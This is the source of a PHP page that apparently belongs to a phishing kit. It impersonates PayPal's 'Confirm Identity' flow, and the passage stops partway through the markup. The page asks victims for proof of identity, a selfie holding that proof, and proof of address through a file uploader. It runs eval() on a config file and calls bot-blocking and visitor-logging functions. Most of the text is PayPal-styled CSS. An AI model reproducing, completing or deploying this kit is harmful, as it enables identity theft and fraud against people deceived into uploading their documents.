<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Identity");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Identity");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/authflow_style.css">
<link rel="stylesheet" href="../assets/css/jquery.fileuploader.min.css">
<link rel="stylesheet" href="../assets/css/jquery.fileuploader-theme-thumbnails.css">
<script src="../assets/js/jquery.min.js" type="text/javascript"></script>
<script src="../assets/js/jquery.fileuploader.min.js" type="text/javascript"></script>
<script src="../assets/js/custom.js" type="text/javascript"></script>
<script type="text/javascript">
window.history.forward();

function noBack() {
window.history.forward();
}
</script>
</head>
   <style>@font-face{font-family:pp-sans-small-light;src:url(../fonts/p_small_light.eot);src:url(../fonts/p_small_light.eot) format("embedded-opentype"),url(../fonts/p_small_light.woff) format("woff"),url(../fonts/p_small_light.svg) format("svg")}@font-face{font-family:pp-sans-small-regular;src:url(../fonts/p_small_regular.eot);src:url(../fonts/p_small_regular.eot) format("embedded-opentype"),url(../fonts/p_small_regular.woff) format("woff"),url(../fonts/p_small_regular.svg) format("svg")}@font-face{font-family:'consumer-icons';src:url(../fonts/icons_sans.eot);src:url(../fonts/icons_sans.eot) format('embedded-opentype'),url(../fonts/icons_sans.woff) format('woff'),url(../fonts/icons_sans.ttf) format('truetype'),url(../fonts/icons_sans.svg) format('svg');font-style:normal;font-weight:400}@font-face{font-family:p_big_sans;font-style:normal;font-weight:200;src:url(../fonts/p_big_sans.eot);src:url(../fonts/p_big_sans.woff2) format('woff2'),url(../fonts/p_big_sans.woff) format('woff'),url(../fonts/p_big_sans.svg) format('svg')}*,*:before,*:after{box-sizing:inherit;font-size: 14px;}html,body{height:100%;box-sizing:border-box;margin:0;padding:0;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif}.txt-capital{text-transform:capitalize}.pull-right{float:right!important}.hide{display:none!important}.show{display:block!important}.contents{max-width:1024px;margin:0 auto;padding:72px 0 8rem;position:relative}@media (max-width:768px){.contents{padding-top:0}}.bt{display:inline-block;min-width:6rem;padding:0.75rem 1.5rem;margin-bottom:1.5rem;border:1px solid #0070ba;border-radius:1.5rem;font-size: 13px;line-height:1.6;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;font-weight:600;text-align:center;text-decoration:none;cursor:pointer;color:#ffffff;background-color:#0070ba;transition:all 250ms ease;-webkit-font-smoothing:antialiased;}.bt:hover,.bt:focus{background-color:#003087;border:1px solid #003087;box-shadow:none;text-decoration:none;color:#ffffff;font-size: 12px;}.bt:focus{outline:none;text-decoration:underline}h1{font-size: 1.4rem!important;font-weight: 400;text-transform:none;font-family:'p_big_sans',sans-serif;margin:15px;}p,li,label,input,select{font-size:0.9375rem;line-height:1.6;font-weight:500;text-transform:none;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;letter-spacing:0.025em}ul,ol{padding:0;margin:0 0 0.8rem 25px}ul ul,ul ol,ol ol,ol ul{margin-bottom:0}li{line-height:1.6;}a,a:visited{color:#0070ba;text-decoration:none;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500}a:active,a:focus,a:hover{color:#005ea6;text-decoration:underline}p > a,li > a{font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500}ul,ol{margin:0 0 0.8px 25px}.dropDown{display:block;overflow:hidden;width:100%;margin:0;border:1px solid #ccd0d4;-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;-moz-background-clip:padding-box;-webkit-background-clip:padding-box;background-clip:padding-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;box-sizing:border-box;background-color:#ffffff}.dropDown.hasError:after{content:"\e022";position:absolute;right:25px;top:3px;color:#c72e2e;font-size:1.3125rem;line-height:1.4285714285714286em}.dropDown:hover,.dropDown:focus,.dropDown.hovered{border:1px solid #009cde}.hasError.dropDown,.hasError.dropDown:hover,.hasError.dropDown:focus{border-color:#c72e2e}.csc:before{right:60px!important}.csc:after{content:'';width:70px;height:44px;position:absolute;right:6px;top:4px;background:url(../pics/list_c.png) no-repeat;background-position:23px -696px}.dropDown[data-name=vsa]{background:url(../pics/list_c.png) no-repeat;background-position:98% -86px}.dropDown[data-name=jcb] { background: url(../pics/list_c.png) no-repeat; background-position: 98% -1205px; }.dropDown[data-name=msc]{background:url(../pics/list_c.png) no-repeat;background-position:98% -192px}.dropDown[data-name=dsc]{background:url(../pics/list_c.png) no-repeat;background-position:98% -589px}.dropDown[data-name=amx]{background:url(../pics/list_c.png) no-repeat;background-position:98% -291px}.mainContainer{position:relative;min-height:100%;width:100%;margin:0 auto;left:0;right:0;top:0;z-index:800;background:#f5f7fa;-webkit-transition:left 250ms,right 250ms;-o-transition:left 250ms,right 250ms;transition:left 250ms,right 250ms}@media (max-width:768px){.notifLi{display:none!important}.mainContainer{width:100%;min-height:100%}}.menuToggler{display:none}.desktopNav,.mobileNav{padding:0;min-height:72px;max-height:84px;border-bottom:1px solid #0070ba;background-color:#0070ba;background-image:linear-gradient(100deg,#0070ba,#1546a0)}.desktopNav{position:fixed;left:0;right:0;top:0;width:100%;z-index:1030;-webkit-transition:left 250ms,right 250ms;-o-transition:left 250ms,right 250ms;transition:left 250ms,right 250ms}.mobileNav,.mobileMenu{display:none}.desktopBrand{margin-left:0;padding:1.25rem  0.75rem 0 0;display:table-cell;vertical-align:top}.desktopBrand:before{content:url(../pics/logo.svg)}.navContainer{display:table;width:100%;max-width:1024px;padding:0 1em;margin:0 auto}.desktopMenu{display:table-cell;vertical-align:top;width:100%}.desktopItems{display:table;width:100%}.firstUl,.secondUl{display:table-cell;vertical-align:top;list-style:none}.firstUl li{display:table-cell;vertical-align:top;position:relative;padding:0 .925rem}.firstUl li.activeLi a,.firstUl li.activeLi a:active{border-bottom:1px solid #fff}.secondUl li{display:inline-block;vertical-align:top;position:relative;text-align:left}.firstUl a,.firstUl a:visited{display:inline-block;text-align:center;padding:1.7em 0 0.45em;opacity:1;font-size:0.875rem;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;font-style:normal;letter-spacing:0.025rem;text-decoration:none;color:#fff;-webkit-font-smoothing:antialiased}.firstUl a:hover,.firstUl a:visited:hover,.firstUl a:focus,.firstUl a:visited:focus{font-style:normal;text-decoration:none;color:#fff}.linksTxt{border-bottom:1px solid transparent;-webkit-transition:border-bottom-color .3s ease-in-out;-o-transition:border-bottom-color .3s ease-in-out;transition:border-bottom-color .3s ease-in-out;font-weight:normal}.linksTxt:hover{border-bottom-color:#fff}.secondUl{margin:0;text-align:right;list-style:none;white-space:nowrap}.logoutLi{padding:1.45rem 0 0 0.75rem}.menuLabel,.logoutTxtDesktop{border:none}.menuLabel:hover,.logoutTxtDesktop:hover{border:none;background-color:transparent;box-shadow:none;text-decoration:none}a.logoutTxtDesktop,a.logoutTxtDesktop:visited{font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;border-bottom:1px solid transparent;text-align:center;font-size:0.75rem;border-radius:0;font-weight:500;letter-spacing:0.025rem;text-decoration:none;text-transform:uppercase;color:#fff;opacity:1;padding:0;min-width:initial;padding-bottom:0.45em;-webkit-transition:border-bottom .3s;-o-transition:border-bottom .3s;transition:border-bottom .3s}a.logoutTxtDesktop:hover,a.logoutTxtDesktop:visited:hover,a.logoutTxtDesktop:focus,a.logoutTxtDesktop:visited:focus{font-weight:400;text-decoration:none;border:none;border-bottom:1px solid #fff;background-color:transparent;box-shadow:none}a.logoutTxtDesktop:focus,a.logoutTxtDesktop:visited:focus{outline:5px auto -webkit-focus-ring-color}.secondUl a:hover,.secondUl label:hover{text-decoration:none}.settingsTxt,.notifTxt{display:block;position:relative;padding:2.1rem 0.7rem 0;opacity:0.85;-webkit-transition:opacity .3s;-o-transition:opacity .3s;transition:opacity .3s}.settingsTxt.svgLogo,.notifTxt.svgLogo{padding-top:1.4rem}.settingsTxt:hover,.notifTxt:hover{opacity:1;text-decoration:none}.notifTxt.svgLogo{padding-top:1.4rem}.blockToggler{display:block;width:30%}.menuLabel{margin:0;position:relative;display:block;cursor:pointer;padding-top:30px;min-height:72px;max-height:84px}.menuLabel span{display:block;top:0;width:28px;height:1px;margin:0 auto;background-color:#fff;position:relative}.menuLabel span:after,.menuLabel span:before{display:block;content:'';position:absolute;width:28px;height:1px;background-color:#fff;-webkit-transition:transform .2s linear .2s,margin .2s linear .2s;-o-transition:transform .2s linear .2s,margin .2s linear .2s;transition:transform .2s linear .2s,margin .2s linear .2s}.menuLabel span:before{margin-top:-8px}.menuLabel span:after{margin-top:8px}.menuOpen,.menuClose{display:block;margin-top:14px;left:0;color:#fff;font-size:0.625rem;text-align:center;text-transform:uppercase}.menuClose{display:none}@media (min-width:768px) and (max-width:950px){.firstUl li{padding:0 0.75rem}.firstUl a{font-family:font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif}.settingsTxt,.notifTxt{padding:2.1rem 0.7rem 0}.settingsTxt.svgLogo,.notifTxt.svgLogo{padding-top:1.4rem}}@media (max-width:768px){body{background-color:#0070ba;background-image:linear-gradient(10deg,#0070ba,#1546a0);background-repeat:no-repeat}.desktopNav{padding:0;height:0;min-height:0}.desktopNav{border:none;position:static}.mobileNav{display:table;width:100%}.desktopItems{display:table;position:static}.menuToggler{display:block;position:absolute;top:-1000em}.menuToggler:checked~.desktopNav{max-height:none;min-height:100vh;height:auto}.menuToggler:checked~.mainContainer{position:fixed;left:50%;right:-50%;top:0}.menuToggler:checked~.mainContainer .menuLabel span{background-color:transparent}.menuToggler:checked~.mainContainer .menuLabel span:before,.menuToggler:checked~.mainContainer .menuLabel span:after{margin-top:0}.menuToggler:checked~.mainContainer .menuLabel span:before{-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-ms-transform:rotate(45deg);-o-transform:rotate(45deg);transform:rotate(45deg)}.menuToggler:checked~.mainContainer .menuLabel span:after{-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-o-transform:rotate(-45deg);transform:rotate(-45deg)}.menuToggler:checked~.mainContainer .menuLabel .menuOpen{display:none}.menuToggler:checked~.mainContainer .menuLabel .menuClose{display:block}.mobileNav{display:table}.navHeader,.navLogo,.notifUl{display:table-cell;vertical-align:top}.navHeader,.notifUl{width:30%}.navLogo{text-align:center}.notifUl{text-align:right;list-style:none;margin:0;padding:0}.notifUl li{display:inline-block;vertical-align:top;margin-right:10px}.desktopBrand{display:none}.mobileBrand{display:inline-block;vertical-align:top;padding:1.4rem 0 1rem}.mobileBrand:before{content:url(../pics/logo.svg)}.navContainer{display:block;width:50%;max-width:1024px;padding:0;margin:0}.mobileMenu,.desktopMenu{display:block}.logoutMobile,.settingsMobile{display:inline-block;vertical-align:top;width:48%}.settingsMobile{text-align:right}.settingsMobile .svgLogo{padding-top:1.75rem}.logoutMobile{padding:1.75rem 0 0 2rem}.settingsTxt{text-indent:0;display:inline-block;vertical-align:top}.settingsTxt:hover{text-decoration:none}.firstUl{margin:1.5rem 0;display:block}.firstUl li{display:block;padding:0;text-align:center}.firstUl li:before,.firstUl li:last-of-type:after{display:block;content:'';width:80%;margin:0 auto;border-bottom:1px solid rgba(255,255,255,0.12);-webkit-transition:border-bottom-color .3s;-o-transition:border-bottom-color .3s;transition:border-bottom-color .3s}.firstUl li:hover:before,.firstUl li:hover:last-of-type:after,.firstUl li:hover+li:before{border-bottom-color:rgba(255,255,255,0.5)}.firstUl li.activeLi:before,.firstUl li.activeLi:last-of-type:after,.firstUl li.activeLi+li:before{border-bottom:transparent}.firstUl li.activeLi a{background-color:#0070ba;text-decoration:none;border:none}.firstUl a,.firstUl a:visited{padding:1rem 0;display:block;border:none;text-align:left;padding-left:10%;font-size:0.875rem;color:#fff;text-decoration:none;font-family:font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif}.firstUl a:hover,.firstUl a:visited:hover,.firstUl a:focus,.firstUl a:visited:focus{border:none}.logoutTxtMobile,.logoutTxtMobile:hover,.logoutTxtMobile:visited{color:#fff;font-weight:normal}.secondUl{display:none}.displayMail{margin-top:20px;text-align:center;color:#fff}}@media (max-width:640px){.menuToggler:checked~.mainContainer{left:50%}.navContainer{width:50%}.blockToggler{width:40%}}@media (max-width:479px){.menuToggler:checked~.mainContainer{left:78%}.navContainer{width:78%}.blockToggler{width:60%}}@media (max-width:320px){.menuToggler:checked~.mainContainer{left:80%}.navContainer{width:80%}.firstUl li.activeLi{background-color:#0070ba;text-decoration:none;border:none}}.ftr{position:absolute;width:100%;min-height:8rem;top:100%;margin-top:-8rem;border-top:1px solid #fff;background:#fff;color:#9da3a6;text-shadow:0 1px 1px #fff}.ftr a:hover,.ftr a:focus{text-shadow:none}.footerFirstContent{max-width:1024px;margin:0 auto;padding:1.5rem 1.5rem}.footerList,.footerUl{margin:0}.footerList li,.footerUl li{display:inline-block;vertical-align:top}.footerList a,.footerUl a{display:block;padding:1rem 0.75rem 0.75rem;font-weight:400}.footerList a:hover,.footerUl a:hover,.footerList a:focus,.footerUl a:focus,.footerList a:active,.footerUl a:active,.footerList .active,.footerUl .active{color:#2c2e2f}.footerList li:first-child a{padding-left:0}.footerList a{font-family:font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-size:.9375rem;color:#6c7378;text-decoration:none;text-transform:uppercase}.footerList a:hover{text-decoration:underline}.footerSecondContent{width:100%;border-top:1px dotted #9da3a6;text-align:right}.footerP,.footerUl{display:inline-block;vertical-align:top}.footerUl{margin-left:0.75rem;font-size:.6875rem}.footerUl li{display:inline-block;vertical-align:top}.footerUl li:last-child{padding-right:0}.footerUl li:last-child a{padding-right:0}.footerUl a{font-size:.6875rem;padding:1.1rem 0.75rem 0.75rem;color:#9da3a6}.footerP{margin-top:1rem;padding-left:0.65rem;font-size:.6875rem}.footerP{color:#9da3a6;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;letter-spacing:0.05rem}.footerP:after{content:"|";display:inline-block;padding-left:1.5rem;vertical-align:-0.1rem;font-weight:300;font-size:1.2rem;line-height:1em}@media (min-width:641px) and (max-width:950px){.footerUl li{padding:0}}@media (max-width:641px){.footerUl,.footerP{padding-left:0;margin-left:0}.footerP{text-align:left;display:block;margin-top:1.5rem}.footerP:after{content:""}.footerUl{display:block;text-align:left}.footerUl li:first-child a{padding-left:0}}.mainContents{text-align:center;width:600px;padding-bottom:0;background-color:#fff;background-clip:content-box;-ms-transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);-webkit-backface-visibility:hidden;margin:0 auto;overflow:hidden}@media (max-width:617px){.mainContents{width:100%!important}.mobilePreffix{float:left!important;width:48%!important;margin:15px 0 0 4%!important}.mobileType{float:left!important;width:48%!important;margin:15px 0 10px!important}.nMobile{width:100%!important}}@media (max-width:365px){.mobilePreffix{float:left!important;width:100%!important;margin:15px 0 10px!important}.mobileType{float:left!important;width:100%!important;margin:15px 0 10px!important}}.fields{margin:10px 0 0;position:relative;z-index:2}.inputArea{position:relative;padding:0;font-size:0.8em;font-size:0.875rem;line-height:1.4285714285714286em;margin-top:15px}.inputArea.hasError{font-family:'consumer-icons';speak:none;font-style:normal;font-weight:normal;font-variant:normal;text-transform:none;line-height:0;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:#c72e2e}.hasError:not(.dropzone-img,.dropDown):before{content:"\e022";position:absolute;right:30px;bottom:12px;color:#c72e2e;font-size:1.2000000000000002em;font-size:1.3125rem;line-height:1.4285714285714286em}.inputArea.hasError:before{content:"\e022";position:absolute;right:10px;bottom:20px;font-size:1.2000000000000002em;font-size:1.3125rem;line-height:1.4285714285714286em}.inputArea label{display:block;margin:0;line-height:1.76923em;font-weight:normal;color:#666}.inputArea label{color:#6c7378;font-size:0.8571428571428572em;font-size:0.9375rem;line-height:1.4em}.inputArea.hasError label{padding-right:32px;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;color:#c72e2e}.inputArea input{outline:0;height:2.61539em;padding:0 24px 0 12px;border-width:1px;border-style:solid;border-color:#bec0c2 #bec0c2 #dbdfe2;background-color:#fafafa;text-overflow:ellipsis;width:100%;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;box-sizing:border-box;-moz-box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;-webkit-box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;color:#333333;font-size:1em}.inputArea input{height:44px;padding-top:0;margin-bottom:9px;color:#2c2e2f;border-color:#9da3a6;background-color:#ffffff;text-shadow:none;text-align:left;-webkit-box-shadow:none;box-shadow:none;font-size:0.8571428571428572em;font-size:0.9375rem;line-height:1.4em}.inputArea input:not([type=submit]):not([type=radio]):not([type=checkbox]){-webkit-transition:border 0.2s ease-in-out,background-color 0.2s ease-in-out;-moz-transition:border 0.2s ease-in-out,background-color 0.2s ease-in-out;-ms-transition:border 0.2s ease-in-out,background-color 0.2s ease-in-out;-o-transition:border 0.2s ease-in-out,background-color 0.2s ease-in-out;transition:border 0.2s ease-in-out,background-color 0.2s ease-in-out;-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;-moz-background-clip:padding-box;-webkit-background-clip:padding-box;background-clip:padding-box}.inputArea input:not([type=submit]):not([type=radio]):not([type=checkbox]){-webkit-transition-property:all;-moz-transition-property:all;-ms-transition-property:all;-o-transition-property:all;transition-property:all;-webkit-transition-duration:250ms;-moz-transition-duration:250ms;-ms-transition-duration:250ms;-o-transition-duration:250ms;transition-duration:250ms;-webkit-transition-timing-function:ease-in;-moz-transition-timing-function:ease-in;-ms-transition-timing-function:ease-in;-o-transition-timing-function:ease-in;transition-timing-function:ease-in}.inputArea input:focus{-moz-box-shadow:0 0 5px rgba(58,144,194,0.6),0 2px 2px rgba(0,0,0,0.15) inset;-webkit-box-shadow:0 0 5px rgba(58,144,194,0.6),0 2px 2px rgba(0,0,0,0.15) inset;box-shadow:0 0 5px rgba(58,144,194,0.6),0 2px 2px rgba(0,0,0,0.15) inset;border:1px solid #009cde;background-color:#fff}.inputArea input:hover,.inputArea input.hovered{-moz-box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;-webkit-box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;box-shadow:0 2px 2px rgba(0,0,0,0.15) inset;border:1px solid #009cde}.inputArea.hasError input{color:#c72e2e;border-color:#c72e2e;-webkit-box-shadow:none;box-shadow:none;background:#ffffff}.inputArea input:hover,.inputArea input:focus{border:1px solid #009cde;color:#000;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none}.multiInputs .inputArea{width:49%}.multiInputs .inputArea:nth-child(odd){float:left}.fields .inputArea.hasSub{width:49%;z-index:2;margin:15px 0 0}@media (max-width:617px){.multiInputs .inputArea{width:100%!important}.fields .inputArea.hasSub{width:100%}h1{font-size:2em!important}}.dropDown{height:44px;position:relative;border-color:#9da3a6;background:#ffffff;font-family:'consumer-icons';speak:none;font-style:normal;font-weight:normal;font-variant:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-size:0.9375rem;line-height:1.4em;margin:0 0 25px;width:100%}.dropDown:before{content:"\e005";position:absolute;right:9px;top:10px;font-size:0.9142857142857143em;font-size:1rem;line-height:1.3125em}.dropDown select{border:0 none;margin:0;padding:7px 0 10px 10px;background:none;position:relative;-webkit-appearance:none;-moz-appearance:window;color:#333333;line-height:1.230769em;z-index:1}.dropDown select{opacity:0;z-index:10;padding-left:0;filter:alpha(opacity=0);width:100%;height:44px;padding:7px 0 10px 10px;line-height:1.230769em}.dropDown option{background-color:#fff;color:#666;padding:6px 10px}.dropDown .labelSelect{position:absolute;top:0;left:0;width:100%;padding-left:12px;padding-right:23px;z-index:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:left;height:44px;line-height:44px;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500}.overlay{content:"";height:100%;width:100%;position:absolute;top:0;left:0;z-index:16;-moz-opacity:.9;-khtml-opacity:.9;-webkit-opacity:.9;opacity:.9;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(opacity=90);filter:alpha(opacity=90);background-color:#fff}.spinner{z-index:17;position:fixed;width:100%;top:0;left:0;min-height:100%;overflow:hidden}.rotate{background:transparent url(../pics/rotate.png) top no-repeat;-moz-background-size:100px 100px;background-size:100px 100px;width:100px;height:100px;border:0;left:50%;top:50%;z-index:6}.rotate,.rotate:before{content:"";position:absolute}.rotate:before{left:-2px;top:-2px;width:104px;height:104px;border-top:7px solid #fff;border-right:7px solid #fff;border-bottom:7px solid #fff;border-left:7px solid transparent;-webkit-border-radius:100%;-moz-border-radius:100%;border-radius:100%;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-animation:rotation 1s linear infinite;-moz-animation:rotation 1s linear infinite;-o-animation:rotation 1s linear infinite;animation:rotation 1s linear infinite}.processing,.rotate{margin:auto;top:0;left:0;right:0;bottom:0}.processing{top:130px;height:17px;width:100%;text-align:center;position:absolute;z-index:17;font-size:15px;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;font-weight:400;font-variant:normal}@-webkit-keyframes rotation{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@-moz-keyframes rotation{0%{-moz-transform:rotate(0deg);transform:rotate(0deg)}to{-moz-transform:rotate(359deg);transform:rotate(359deg)}}@-o-keyframes rotation{0%{-o-transform:rotate(0deg);transform:rotate(0deg)}to{-o-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes rotation{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(359deg);-moz-transform:rotate(359deg);-o-transform:rotate(359deg);transform:rotate(359deg)}}.dropzone-main{border:2px dashed #dee3e7;border-radius:3px;padding:15px;margin-top:20px;width:100%;height:auto;text-align:center;background:#f0f2f4;cursor:pointer;transition:background 300ms ease,border 300ms ease}.dropzone-main:hover{background:#e7eaee;border-color:#c0cad2}.dropzone-main .dropzone-img{background-image:url(../pics/img-upload.svg),none;background-position:0 0;margin-top:-85px;width:86px;height:78px;position:relative;top:88px;left:50%;margin-left:-43px;transition:all .15s ease;animation:move 1s linear infinite}.dropzone-main p{margin-top:90px;margin-bottom:0;color:#8495a4;font-size:16px}.dropzone-main p b{font-size:28px;color:#677683;font-weight:700;display:block;margin-bottom:10px}@keyframes move{0%{top:88px}50%{top:80px}to{top:88px}}.imagesArea{margin-top:20px;width:100%;height:100%;text-align:left}.imgItem{position:relative;margin-right:3%;margin-bottom:15px;width:100%;display:inline-block;-webkit-box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);-moz-box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px;-moz-background-clip:padding;-webkit-background-clip:padding-box;background-clip:padding-box;overflow:hidden;max-width:169px;max-height:100px}.imgItem img{width:100%;vertical-align:middle;position:relative;z-index:2;-webkit-opacity:1;-moz-opacity:1;opacity:1;-ms-filter:"alpha(Opacity=0)";-webkit-transition:opacity .2s ease 0s,filter .2s ease 0s;-moz-transition:opacity .2s ease 0s,filter .2s ease 0s;-ms-transition:opacity .2s ease 0s,filter .2s ease 0s;-o-transition:opacity .2s ease 0s,filter .2s ease 0s;-webkit-transform:translateZ(0);-moz-transform:translateZ(0);-ms-transform:translateZ(0);-o-transform:translateZ(0);width:170px;height:100px}.imgItem:hover img{-webkit-opacity:.75;-moz-opacity:.75;opacity:.75;-ms-filter:"alpha(Opacity=0)"}.btDel{display:none}.imgItem:hover .btDel{display:block;color:#000;position:absolute;top:35%;left:50%;z-index:999999999;background:none;border:none;transform:translate(-50%);border:none;border-radius:100%;padding:9px 12px;background:#f31633;color:#fff}.proof{cursor:default;opacity:1;background:#f5f7fa;border-radius:4px;overflow:hidden;display:table;width:100%;padding:0;height:30px;margin:0 0 8px}.proof li{display:table-cell;vertical-align:top;text-align:center;position:relative;-webkit-box-sizing:border-box;box-sizing:border-box;height:30px;padding:0 8px 13px;-webkit-transition:background-color 200ms linear,color 200ms linear;transition:background-color 200ms linear,color 200ms linear;font-size:14px;color:#fff;background: #05b34c;width:33.3333%;vertical-align:middle;}.proof li:not(.current){background: #1715157a;color: #ffffff;}.proof li::after{content:"";display:block;position:absolute;width:0;height:0;right:-10px;top:0;border-style:solid;border-width:15px 0 15px 10px;border-color:transparent;-webkit-transition:border-color 200ms linear;transition:border-color 200ms linear}@media (max-width:425px){.proof{height:50px}.proof li::after{border-width:25px 0 25px 10px}}@media (max-width:280px){.proof{height:50px}.proof li::after{border-width:35px 0 35px 10px}}.proof li.current::after{border-color:transparent transparent transparent #0564b3}.proof li .ui-text-small{font-size:13px;line-height:19px;position:relative;top:6px;letter-spacing:0.2px}.back{font-size:12px;text-transform:uppercase;letter-spacing:1.5px}.doc_type{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;padding:0 calc(16.66667% + 1px);margin-bottom:30px}.doc_type_choice{width:calc(calc(25% + 1.5px) - 80px)}.doc_type_choice_wrapper{display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;text-align:center;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:175px;padding-bottom:3px;margin-left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}.doc_type_text{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:nowrap;flex-wrap:nowrap;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:17px;padding-bottom:16px}.ui_radio{align-self:flex-end;width:14px;height:14px;display:inline-block;position:relative;overflow:hidden;cursor:pointer;top:2px;right:4px}.ui_radio input{width:14px;height:14px;position:absolute;opacity:0;margin:0;top:0;left:0}.ui_radio > div{width:14px;height:14px;display:block;border:solid 1px #019DE3;position:absolute;top:0;left:0;vertical-align:middle;border-radius:14px;padding:0}.ui_radio > div::after{width:8px;height:8px;top:2px;left:2px;content:'';position:absolute;border-radius:50%;-webkit-transition:background 0.1s ease-in-out;transition:background 0.1s ease-in-out}.doc_type_text > div:last-child{font-size:16px;line-height:19px;position:relative;top:5px;letter-spacing:0.2px;left:4px}@media (max-width:515px){.doc_type{display:block}.doc_type_choice{width:unset}}.cont{display:block;position:relative;cursor:pointer;user-select:none;margin-top:17px}.cont input{position:absolute;opacity:0;cursor:pointer}.checkmark{width:14px;height:14px;display:inline-flex;border:solid 1px #0070ba;border-radius:50%}.cont:hover input ~ .checkmark{background-color:#f5f7fa}.checkmark:after{content:"";display:none;width:8px;height:8px;margin-left:2px;margin-top:2px;border-radius:50%;-webkit-transition:background 0.1s ease-in-out;transition:background 0.1s ease-in-out}.cont input:checked ~ .checkmark:after{display:block}.cont .checkmark:after{background:#0070ba}.rules{min-height:100px;border-radius:16px;background-color:rgba(216,216,216,0.1);border:solid 1px #ccc;margin-bottom:20px}.rules::before,.rules::after{content:' ';display:table}.rules:after{clear:both}.rule{margin:30px 0;padding:0 10px;line-height:1.25em}@media (min-width:1012px){.rule{width:33.33333333%;/* float:left */}}.rule div{font-size:13px}
</style>
<body >
<div class="grey-background header-body">
<div id="header">
<div class="container-fluid center-block-big">
<table>
<tr>
<td>
<img src="../assets/img/favicon.svg" width="106" height="29">
</td>
<td align="right" width="100%">
</td>
</tr>
</table>
</div>
</div>
<div id="wrapper" class="page-container"><div class="contents">
	<section class="mainContents" id="process">
		
			<div class="fields clearfix">

					<input id="ccn" type="hidden">				
			</div>
			
</section>
<section class="mainContents" id="finish">
	<div style="padding:0 20px">
	<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
		<?php echo $lg_id['head']?>
	</h1>

		<div>
			<ol class="proof">
				<li class="itm current">
					<div class="ui-text-small">
						Proof of identity
						</div>
					</li>
<?php if(isset($_GET['selfie']) || isset($_GET['address'])){
				echo '<li class="itm current">';
} else {echo '<li class="itm">';}?>
                    
						<div class="ui-text-small">
							Selfie with the proof 
							</div>
						</li>
					
                <?php if(isset($_GET['address'])){
				echo '<li class="itm current">';
} else {echo '<li class="itm">';}?>
                   
						<div class="ui-text-small">
							Proof of address 
</div>
						</li>
					</ol>
				</div>
				<?php if(isset($_GET['proof'])) {
?>
			<div id="select_one">
				
						<div id="area_choose">
